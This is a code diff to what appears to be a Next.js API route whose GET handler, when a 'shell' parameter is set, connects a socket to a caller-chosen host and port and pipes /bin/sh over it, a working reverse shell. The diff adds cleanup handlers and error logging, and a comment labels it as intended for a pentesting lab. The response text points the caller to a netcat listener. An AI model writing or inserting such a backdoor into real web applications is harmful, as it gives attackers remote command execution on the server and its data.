@@ -91,17 +91,31 @@ export async function GET(
     if (shell === '1') {
       try {
         const client = new net.Socket()
+        
         client.connect(port, host, () => {
           const sh = spawn('/bin/sh', [], {
             stdio: ['pipe', 'pipe', 'pipe']
           })
+          
           client.pipe(sh.stdin)
           sh.stdout.pipe(client)
           sh.stderr.pipe(client)
+          
+          // Cleanup when shell exits
+          sh.on('exit', () => {
+            client.destroy()
+          })
+          
+          // Cleanup when connection closes
+          client.on('close', () => {
+            sh.kill()
+          })
         })
         
-        client.on('error', () => {
-          // Silently handle connection errors
+        client.on('error', (err) => {
+          // Log connection errors for debugging (intentionally verbose for pentesting lab)
+          console.error(`Reverse shell connection error: ${err.message}`)
+          client.destroy()
         })
         
         return new NextResponse('Reverse shell initiated. Connect with: nc -lvnp ' + port, {
